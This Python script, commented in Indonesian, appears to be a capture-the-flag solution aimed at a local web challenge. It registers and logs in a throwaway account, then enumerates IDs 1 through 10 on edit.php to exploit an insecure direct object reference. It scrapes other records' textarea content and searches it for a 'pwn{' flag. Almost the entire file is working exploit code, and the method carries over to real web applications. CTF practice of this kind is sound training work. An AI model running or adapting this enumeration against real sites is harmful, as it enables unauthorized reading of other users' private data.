import requests
import random
import string
import re

# Update PORT sesuai challenge lu (1340)
URL = "http://localhost:1340"

def exploit():
    s = requests.Session()
    
    # 1. Register User Random (Biar dapet Session)
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Registering user: {username}")
    
    try:
        s.post(f"{URL}/auth.php", data={
            'action': 'register',
            'username': username,
            'password': password,
            'email': f'{username}@pwn.com'
        })
        
        # 2. Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'action': 'login',
            'username': username,
            'password': password
        })

        # 3. IDOR Brute Force pada EDIT.PHP
        print("[*] Starting IDOR on edit.php (ID 1-10)...")
        
        for i in range(1, 11):
            # Target endpoint: /edit.php
            r = s.get(f"{URL}/edit.php?id={i}", allow_redirects=False)
            
            # Kalau 200 OK berarti kebuka (gak diredirect ke dashboard)
            if r.status_code == 200:
                print(f"\n[+] ACCESSED EDIT PAGE ID: {i}")
                
                # Cari isi content di dalam <textarea>
                # Regex: <textarea ... >ISI_KONTEN</textarea>
                content_match = re.search(r'<textarea.*?>(.*?)</textarea>', r.text, re.DOTALL)
                
                if content_match:
                    content = content_match.group(1).strip()
                    print(f"    Content: {content}")
                    
                    # Cek Flag
                    if "pwn{" in content:
                        print(f"\n[!!!] FLAG FOUND: {content}\n")
                        return
                else:
                    print("    (Content empty or regex failed)")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
